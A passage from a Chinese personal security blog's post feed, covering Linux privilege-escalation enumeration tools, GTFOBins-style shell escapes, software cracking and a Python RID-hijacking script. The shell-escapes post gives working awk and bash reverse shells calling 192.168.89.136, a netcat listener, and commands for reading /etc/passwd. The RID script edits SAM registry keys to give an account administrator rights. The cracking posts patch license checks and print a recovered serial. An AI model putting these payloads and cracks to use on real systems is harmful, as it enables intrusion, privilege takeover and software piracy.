//获取到json并解码为utf8</span><br><span class="line">        head_dic=json.loads(head_json) //解析josn</span><br><span class="line">        data_size=head_dic[&quot;data_size&quot;] //得到字节总</span><br><span class="line"></span><br><span class="line">        recv_size=0</span><br><span class="line">        recv_data=b&apos;&apos;</span><br><span class="line">        while recv_size&lt;data_size: </span><br><span class="line">            js=clients.recv(1024) //读取数据</span><br><span class="line">            print(js)</span><br><span class="line">            recv_size+=len(js) //字节和返回数据长度加在一起</span><br><span class="line">            print(recv_size)</span><br><span class="line">            print(&apos;recv_data:&apos;,recv_data) //b&apos;&apos;+返回数据</span><br><span class="line">            recv_data+=js</span><br><span class="line">         print(recv_data.decode(&apos;utf-8&apos;)) //解码为utf-8</span><br><span class="line">    clients.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    host=&apos;127.0.0.1&apos;</span><br><span class="line">    port=4447</span><br><span class="line">    client(host,port)</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>通过脚本升级Linux权限</title>
      <link href="/posts/7eb122.html"/>
      <url>/posts/7eb122.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文翻译自<a href="http://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/" target="_blank" rel="noopener">Linux Privilege Escalation via Automated Script</a><br><img src="http://img.netbian.com/file/2018/0501/7bfb095480846b26e8fb392e3294ab28.jpg" alt="7bfb095480846b26e8fb392e3294ab28.jpg"></p><p>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我们都知道，在破坏受害者的机器之后，我们有一个低权限的shell，我们想要升级到更高权限的shell，这个过程称为权限提升。今天在本文中，我们将讨论权限提升的内容以及攻击者如何识别低权限shell可以升级到更高权限的shell。但除此之外，还有一些Linux脚本在尝试升级目标系统上的权限时可能会有用。这通常旨在枚举而不是特定的漏洞/漏洞利用。这种类型的脚本可以节省您的时间。<br>表中的内容<br>介绍<br>权限提升的向量<br>LinuEnum<br>Linuxprivchecker<br>Linux Exploit Suggester 2<br>Bashark<br>BeRoot<br>介绍<br>基本上，权限提升是攻击者攻击受害者机器之后的一个阶段，他试图收集与系统相关的关键信息，如隐藏密码和弱配置服务或应用程序等。所有这些信息都有助于攻击者利用帖子进行攻击反对机器获得更高权限的shell。</p><p>权限提升的向量<br>操作系统详细信息和内核版本<br>安装或运行任何Vulnerable包<br>具有完全控制或修改访问权限的文件和文件夹<br>具有SUID权限的文件<br>映射驱动器（NFS）<br>潜在有趣的文件<br>环境变量路径<br>网络信息（接口，arp，netstat）<br>运行进程<br>Cronjobs<br>用户的Sudo Right<br>通配符注入<br>在Penetration测试中有几个脚本用于快速识别Windows系统上的潜在权限提升向量，今天我们将详细说明每个脚本正在顺利运行。</p><p>LinuEnum<br>脚本本地Linux枚举和权限提升检查Shellscript，它枚举系统配置和LinEnum执行的检查/任务的高级摘要。</p><p>特权访问：诊断当前用户是否具有没有密码的sudo访问权限; root的主目录是否可访问。</p><p>系统信息：主机名，网络详细信息，当前IP等。</p><p>用户信息：当前用户，列出所有用户，包括uid / gid信息，列出root帐户，检查密码哈希是否存储在/ etc / passwd中。</p><p>内核和分发版本详细信息。</p><p>您可以通过以下命令通过github下载它：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rebootuser/LinEnum.git</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/11/iqNMO1.png" alt="iqNMO1.png"><br>下载此脚本后，您只需 在终端上绑定./LinEnum.sh即可运行它  。因此，它将转储所有获取的数据和系统详细信息。</p><p>让我们分析它给我们带来的结果：</p><p>操作系统和内核信息： 4.15.0-36-generic，Ubuntu-16.04.1<br><img src="https://s1.ax1x.com/2018/11/11/iqNa6A.png" alt="iqNa6A.png"><br>此外…..</p><p>超级用户帐户：root</p><p>Sudo Rights用户：jiu</p><p>主页目录文件权限</p><p>环境信息</p><p>还有更多这样的事情属于邮政剥削。<br><img src="https://s1.ax1x.com/2018/11/11/iqNB0P.md.png" alt="iqNB0P.md.png"><br>这个脚本的功能有以下功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">1.列出系统的版本信息</span><br><span class="line">2.具体分布信息</span><br><span class="line">3.主机名</span><br><span class="line">4.目前的权限</span><br><span class="line">5.以前系统登录到的用户</span><br><span class="line">6.其他人登录</span><br><span class="line">7.所有组</span><br><span class="line">8.列出管理用户</span><br><span class="line">9.列出/etc/passwd的内容</span><br><span class="line">10.超级用户账户</span><br><span class="line">11.Sudo Rights用户</span><br><span class="line">12.主页目录文件权限</span><br><span class="line">13.环境信息</span><br><span class="line">14.路径信息</span><br><span class="line">15.可用的shell</span><br><span class="line">16.当前用户的值</span><br><span class="line">17.密码和存储信息</span><br><span class="line">18.时间运行事件</span><br><span class="line">19.文件权限</span><br><span class="line">20.jobs最后的执行时间</span><br><span class="line">21.系统计时</span><br><span class="line">22.网络信息</span><br><span class="line">23.ARP缓存表</span><br><span class="line">24.路由表</span><br><span class="line">25.开启的TCP端口</span><br><span class="line">26.开启的UDP端口</span><br><span class="line">27.正在运行的进程和权限</span><br><span class="line">28.运行进程</span><br><span class="line">29./ETC/IIT.D/二进制权限</span><br><span class="line">30./LB/StReD/*CONFIG文件权限</span><br><span class="line">31.sudo版本</span><br><span class="line">32.mysql版本</span><br><span class="line">33.Apache版本</span><br><span class="line">34.Apache的插件</span><br><span class="line">35.有用的文件位置</span><br><span class="line">36.已安装的编译器</span><br><span class="line">37.敏感文件的权限</span><br><span class="line">38.所有的conf文件</span><br><span class="line">39.当前用户的历史文件</span><br><span class="line">40.执行过的命令</span><br><span class="line">41.纽约趣味邮件/VAL/mail</span><br><span class="line">42.docker版本</span><br><span class="line">43.dorcker文件</span><br><span class="line">44.所有yml文件</span><br></pre></td></tr></table></figure></p><p>Linuxprivchecker<br>枚举系统配置并运行一些权限提升检查。这是一个python实现，建议特定于系统的漏洞利用。使用wget从其源URL下载脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.securitysift.com/download/linuxprivchecker.py</span><br></pre></td></tr></table></figure></p><p>现在使用这个脚本只需 在终端上键入 python linuxprivchecke.py，这将枚举文件和目录权限/内容。此脚本与LinEnum的工作方式相同，并且可以搜索与系统网络和用户相关的详细信息。</p><p>python linuxprivchecker.py<br><img src="https://s1.ax1x.com/2018/11/11/iqUVBt.png" alt="iqUVBt.png"><br>Root以外用户的可写目录和文件<br><img src="https://s1.ax1x.com/2018/11/11/iqUlcj.md.png" alt="iqUlcj.md.png"></p><p>检查Root的主文件夹是否可访问<br><img src="https://s1.ax1x.com/2018/11/11/iqdCyd.png" alt="iqdCyd.png"></p><p>具有SUID / SGID权限的文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdATP.md.png" alt="iqdATP.md.png"><br>Linux Exploit Suggester 2<br>基于Linux_Exploit_Suggester的下一代漏洞利用建议器。该程序执行’uname -r ‘以获取Linux操作系统发行版，并返回可能的漏洞利用列表。</p><p>此脚本对于快速查找现场和考试环境中的权限提升漏洞非常有用。</p><p>主要改进包括：</p><p>更多的漏洞<br>准确的通配符匹配。这扩大了可搜索漏洞的范围。<br>输出着色，便于查看。<br>还有更多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jondonas/linux-exploit-suggester-2.git</span><br><span class="line">cd linux-exploit-suggester-2</span><br></pre></td></tr></table></figure></p><p>这里我就不整这款了</p><p>Bashark<br>Bashark在安全审计的后期开发阶段帮助测试人员和安全研究人员。</p><p>它的特点</p><p>单个Bash脚本<br>轻巧快速<br>多平台：Unix，OSX，Solaris等<br>没有外部依赖<br>免疫启发式和行为分析<br>内置常用shell命令的别名<br>使用面向开发后的功能扩展系统shell<br>隐身，退出时激活自定义清理例程<br>易于扩展（通过创建Bash函数添加新命令）<br>完整标签完成<br>执行以下命令从github下载它：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TheSecondSun/Bashark.git</span><br><span class="line">cd Bashark</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/11/iqd40I.md.png" alt="iqd40I.md.png"><br>他的帮助：<br><img src="https://s1.ax1x.com/2018/11/11/iqd7h8.png" alt="iqd7h8.png"><br>扫描出开放的端口和寻找conf文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdb9S.md.png" alt="iqdb9S.md.png"><br>使用getprem选项查看目标计算机的所有二进制文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdLcQ.png" alt="iqdLcQ.png"><br>获取用户名<br><img src="https://s1.ax1x.com/2018/11/11/iqw1jH.png" alt="iqw1jH.png"><br>BeRoot<br>BeRoot项目是一种后期利用工具，用于检查常见的错误配置，以找到升级我们的权限的方法。这个工具没有实现任何利用。它的主要目标不是实现主机的配置评估（列出所有服务，所有进程，所有网络连接等），而是仅打印已被发现作为升级我们的权限的潜在方式的信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AlessandroZ/BeRoot.git</span><br><span class="line">cd Linux</span><br><span class="line">chmod 777 beroot.py</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/11/iqww8S.md.png" alt="iqww8S.md.png"><br>枚举出的提权漏洞<br><img src="https://s1.ax1x.com/2018/11/11/iqwruj.png" alt="iqwruj.png"><br>PS：这款工具还有针对windows的</p><p>以上就到这里，先溜</p><p>总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用好这几款脚本</span><br><span class="line"></span><br><span class="line">进行信息收集提权，应该不难</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解某仓库软件</title>
      <link href="/posts/3774494d.html"/>
      <url>/posts/3774494d.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚刚考完期中考试，回来学习shark恒第17课，记录如下<br><img src="https://s1.ax1x.com/2018/11/09/ibtFkF.jpg" alt="ibtFkF.jpg"><br>期中考，睡了二节课，没写作文…..<br>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=489302379&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>拿到PE程序还是常规操作，首先查壳<br><img src="https://s1.ax1x.com/2018/11/09/ibtkY4.png" alt="ibtkY4.png"><br>查壳之后发现无壳，直接将程序载入OD<br><img src="https://s1.ax1x.com/2018/11/09/ibtAfJ.png" alt="ibtAfJ.png"><br>F9运行程序，然后输入假码，F12暂停在错误部分<br><img src="https://s1.ax1x.com/2018/11/09/ibthAU.md.png" alt="ibthAU.md.png"><br>按快捷键Alt+F9跳到代码区，然后在错误框框里按确认<br><img src="https://s1.ax1x.com/2018/11/09/ibt5h4.png" alt="ibt5h4.png"><br>发现错误的call，然后往上分析，看见两个jmp。发现三个jmp，其中两个jmp都是跳到错误call的，一个jmp跳回到程序开始<br><img src="https://s1.ax1x.com/2018/11/09/ibt7cR.md.png" alt="ibt7cR.md.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibtqnx.png" alt="ibtqnx.png"></p><p>这三个jmp先不管，继续往上翻。可以看到一个je，并且是实现跳转，跳到错误call<br><img src="https://s1.ax1x.com/2018/11/09/ibtjAO.png" alt="ibtjAO.png"><br>将这个je，下断点。重新运行程序，然后发现是关键跳，那么上面的call就是关键call了<br><img src="https://s1.ax1x.com/2018/11/09/ibNiut.md.png" alt="ibNiut.md.png"><br>修改Z标志位可以实现注册成功<br><img src="https://s1.ax1x.com/2018/11/09/ibNEE8.md.png" alt="ibNEE8.md.png"><br>以为这样就搞定了，然后发现是重启验证<br><img src="https://s1.ax1x.com/2018/11/09/ibNVUS.png" alt="ibNVUS.png"><br>既然这样，我们只能对他的关键call进行下断。然后进call找激活码（PS:关键跳是判断激活码是否正确的，那么关键call就是对比激活码的。代码在到关键跳进行判断）<br><img src="https://s1.ax1x.com/2018/11/09/ibNn3j.png" alt="ibNn3j.png"><br>F7进call，过循环，F8单步几下即可找到真码<br><img src="https://s1.ax1x.com/2018/11/09/ibNavR.md.png" alt="ibNavR.md.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibNwK1.png" alt="ibNwK1.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibN0Dx.png" alt="ibN0Dx.png"></p><p><img src="https://s1.ax1x.com/2018/11/09/ibNRxA.md.png" alt="ibNRxA.md.png"><br>真码为：DEPw-1303245d5-0303<br>感谢观看！</p><p>转载请转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux绕过本地安全策略防御</title>
      <link href="/posts/49ae8f0.html"/>
      <url>/posts/49ae8f0.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>This is Linux绕过本地安全策略….<br><img src="http://d.5857.com/quanzhilieren_141016/004.jpg" alt=""><br>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=718765&auto=1&height=66"></iframe></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>apt-get 获取shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get changelog apt</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/03/i59qzD.png" alt="i59qzD.png"><br><img src="https://s1.ax1x.com/2018/11/03/i59XsH.png" alt="i59XsH.png"></p><p>aria2c<br>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=&apos;id&apos;</span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo &quot;$COMMAND&quot; &gt; $TF</span><br><span class="line">chmod +x $TF</span><br><span class="line">aria2c --on-download-error=$TF http://x</span><br></pre></td></tr></table></figure></p><p>ash<br>获取shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ash</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/04/i5PaHs.md.png" alt="i5PaHs.md.png"><br>写入文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LFILE=&quot;1.txt&quot;</span><br><span class="line">ash -c &apos;echo haq5201314 &gt; $FILE&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/04/i5Ps3T.png" alt="i5Ps3T.png"></p><p>awk<br>获取shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/04/i5e5ct.png" alt="i5e5ct.png"><br>反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.89.136/4444&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>受害机上执行<br><img src="https://s1.ax1x.com/2018/11/04/i5mEC9.png" alt="i5mEC9.png"><br>攻击者上执行<br>nc -lvp 4444<br><img src="https://s1.ax1x.com/2018/11/04/i5mV3R.png" alt="i5mV3R.png"></p><p>base64读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=&quot;/etc/passwd&quot;</span><br><span class="line">base64 &quot;$LFILE&quot; | base64 --decode</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/04/i5mZg1.png" alt="i5mZg1.png"></p><p>bash反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &apos;bash -i &gt;&amp; /dev/tcp/192.168.89.136/12345 0&gt;&amp;1&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/04/i5muDK.png" alt="i5muDK.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 12345</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/11/04/i5mKHO.png" alt="i5mKHO.png"></p><p>详细文章请看：<a href="https://gtfobins.github.io/gtfobins/busybox/" target="_blank" rel="noopener">busybox | GTFOBins</a><br>你想要反的shell：<a href="https://www.freebuf.com/articles/system/147768.html" target="_blank" rel="noopener">关于Shell你想知道的都在这儿 - FreeBuf互联网安全新媒体平台</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序跑飞了</title>
      <link href="/posts/fbb10a6b.html"/>
      <url>/posts/fbb10a6b.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时间过的真是快，转眼就已经到了期中考了。还好我这个星期参加了比赛，不用考试。老师给的分比我自己考的还要高[滑稽]<br><img src="https://s1.ax1x.com/2018/11/02/ihxPVf.jpg" alt="ihxPVf.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>恒大的课程第16课，去除qq桌球瞄准器的附加安装，学习到了不少。在此做个总结<br>首先拿到PE还是先查壳，PEID一查无壳<br><img src="attachments\c0abd1ee.png" alt="c0abd1ee.png"><br>拖入OD，运行F8，发现程序飞了..<br><img src="https://s1.ax1x.com/2018/11/02/ihxDiD.png" alt="ihxDiD.png"><br>对其下断点，程序运行程序。F7进入call ,然后继续F8，找到下一个会跳出框框的call<br><img src="https://s1.ax1x.com/2018/11/02/ihxho8.png" alt="ihxho8.png"><br>在寻找下一个call 的时候，我们的程序运行到了一个loop，解决方法是通过F4运行到指定位置<br><img src="https://s1.ax1x.com/2018/11/02/ihxOe0.png" alt="ihxOe0.png"></p><p><img src="https://s1.ax1x.com/2018/11/02/ihxzYF.md.png" alt="ihxzYF.md.png"><br>然后继续F8，发现到下一个冒出这个框框的地址，方法如上<br><img src="https://s1.ax1x.com/2018/11/02/ihzPyR.png" alt="ihzPyR.png"><br>然后继续F8，发现下一个出现框框的地址，方法还是一样，直到发一个jnz判断是否跳过的call的<br>将那个jnz改为jmp就能跳过了<br><img src="https://s1.ax1x.com/2018/11/02/ihz30P.md.png" alt="ihz30P.md.png"><br>寻找关键跳判断call，这里我发现一个小技巧，会有一点不同，他是运行一秒之后又变成了暂停，这代表就是最好一个地址，直接Noop掉也可以</p><p>其实去除指定位置的框框最好的方法就是F12暂停法，暂停下来，显示地址调用在进call跟踪，或者直接把cll给nop掉完事</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python实现rid劫持</title>
      <link href="/posts/b921a9fe.html"/>
      <url>/posts/b921a9fe.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个星期的时候在弄rid劫持的实验，当时想用python写个rid劫持的操作。后面时间不够上学了<br>这个星期回来整了出来。星期五被win32API弄的心态崩了= =后面换了种思路<br><img src="https://s1.ax1x.com/2018/10/27/i65Mb8.jpg" alt="i65Mb8.jpg"></p><p>#正文#<br>先说一下一开始的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一开始我是想着用win32API和win32con读取注册表的键值进行修改的</span><br><span class="line">但是REG_BINARY类型的值死活你用bytes类型的格式进行修改，后面我查了</span><br><span class="line">读取出来键值的值的编码类型，解码出来简直是神鬼难救啊，这改个鬼鬼哦</span><br></pre></td></tr></table></figure></p><p>解出来的是这种东西，你不解就修改不了，因为他是bytes类型<br><img src="https://s1.ax1x.com/2018/10/27/i6535Q.png" alt="i6535Q.png"></p><p>后面今天早上的思路就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用reg命令导出成reg文件，然后修改指定位置的值</span><br><span class="line">在用regdeit  /s  xx.reg,在用win32API读取修改位置的</span><br><span class="line">值进行对比，如果匹配就劫持成功</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import win32api</span><br><span class="line">import win32con</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">n=0</span><br><span class="line">def rid_hack(path):</span><br><span class="line">    try:</span><br><span class="line">        ps_numer=&apos;REG EXPORT HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003F1  &#123;&#125;AppBkUp.reg&apos;.format(path) </span><br><span class="line">        zx=os.system(ps_numer) //导出HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003F1的键值</span><br><span class="line">        n=1</span><br><span class="line">        print(&apos;[+] 命令执行成功&apos;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    time.sleep(1)</span><br><span class="line">    if os.path.exists(&apos;&#123;&#125;AppBkUp.reg&apos;.format(path)): //判断导出的reg 文件是否存在</span><br><span class="line">        print(&apos;[+] ok reg is ok&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] reg in not found&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    dk=open(&apos;&#123;&#125;AppBkUp.reg&apos;.format(path),&apos;r&apos;,encoding=&apos;utf-16&apos;)</span><br><span class="line">    xj=open(&apos;&#123;&#125;Rid_Hack.reg&apos;.format(path),&apos;w&apos;,encoding=&apos;utf-16&apos;)</span><br><span class="line">    for line in dk:</span><br><span class="line">        if &apos;f1&apos; in line:</span><br><span class="line">            line=line.replace(&apos;f1&apos;,&apos;f4&apos;).replace(&apos;03&apos;,&apos;01&apos;) //修改键值</span><br><span class="line">        xj.write(line)</span><br><span class="line"></span><br><span class="line">    dk.close()</span><br><span class="line">    xj.close()</span><br><span class="line"></span><br><span class="line">    zxw=os.system(&apos;regedit /s &#123;&#125;Rid_Hack.reg&apos;.format(path)) //导入注册表</span><br><span class="line">    key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, &apos;SAM\\SAM\\Domains\\Account\\Users\\000003F1&apos;, 0,win32con.KEY_ALL_ACCESS)</span><br><span class="line">    a = win32api.RegQueryValueEx(key, &apos;F&apos;)  //读取F的键值</span><br><span class="line">    if &apos;xf4&apos; and &apos;x01&apos; in str(a[0]): //判断是否存在</span><br><span class="line">        print(&apos;[+] rid劫持成功&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] rid劫持失败&apos;)</span><br><span class="line">if __name__ == &apos;__main__&apos;:[VID_20181027_103535.mp4](attachments\6a167db9.mp4)</span><br><span class="line">    user=input(&quot;路径：&quot;)</span><br><span class="line">    rid_hack(user)</span><br></pre></td></tr></table></figure></p><p>测试结果：</p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/2GnRs-v28Uk" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe><br>转载请声明转自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>about</title>
      <link href="/posts/b5f422e3.html"/>
      <url>/posts/b5f422e3.html</url>
      <content type="html"><![CDATA[<h1 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h1><p><img src="https://s1.ax1x.com/2018/10/20/iBVjAJ.jpg" alt="iBVjAJ.jpg"><br>名称:九世<br>博客:422926799.github.io &amp;&amp; <a href="https://www.cnblogs.com/haq5201314" target="_blank" rel="noopener">东京$ - 博客园</a><br>爱好:渗透测试，破解，各种语言<br>梦想:成为像车王一样的大佬<br>经历:还在读书…</p>]]></content>
      
      
        <tags>
            
            <tag> About </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用DarkDe通过按钮事件寻找关键代码部分</title>
      <link href="/posts/85f395de.html"/>
      <url>/posts/85f395de.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一般的PE关键字搜索不到关键字，等其他办法试完之后，找不到关键代码部分。肯定是非常痛苦的，但是我们可以通过DarKDe来定位布局事件来寻找关键代码。<br><img src="https://s1.ax1x.com/2018/10/20/iBVCwQ.jpg" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此文接着上次的Telnet连接器进行破解，上次我直接搜关键字进行破解的。这次通过定位按钮的段地址</span><br><span class="line">寻找关键代码。</span><br></pre></td></tr></table></figure><p>使用DarkDe注意事项：软件必须是没有壳的，有壳是加载不出使用的函数<br>这里我的壳已经脱掉了，用PEID可以明显的看到是BC++写的<br><img src="https://s1.ax1x.com/2018/10/20/iBVPoj.png" alt="iBVPoj.png"><br>载入DarkDe<br><img src="https://s1.ax1x.com/2018/10/20/iBVVS0.png" alt="iBVVS0.png"><br>点击进程寻找对应按钮的数量<br><img src="https://s1.ax1x.com/2018/10/20/iBVZlV.md.png" alt="iBVZlV.md.png"><br>打开按钮事件，复制第一个段地址，在OD里进行条件搜索，并对其下断点<br><img src="https://s1.ax1x.com/2018/10/20/iBV3f1.md.png" alt="iBV3f1.md.png"><br>对剩下的两个按钮事件步骤一样下断点<br>因为我们这里要破解注册，所以我们把注意力放在注册的按钮上<br><img src="https://s1.ax1x.com/2018/10/20/iBVa0e.md.png" alt="iBVa0e.md.png"><br>既然这个断点是注册按钮的，那么下面的指令肯定是处理注册的，把注意力放下面<br>发现注册成功的语句，寻找跳转语句<br><img src="https://s1.ax1x.com/2018/10/20/iBV0kd.png" alt="iBV0kd.png"><br>对第一个je下断，发现是关键跳，尝试将其nop掉看看是否成功，重启软件发现注册成功<br><img src="https://s1.ax1x.com/2018/10/20/iBVHXT.png" 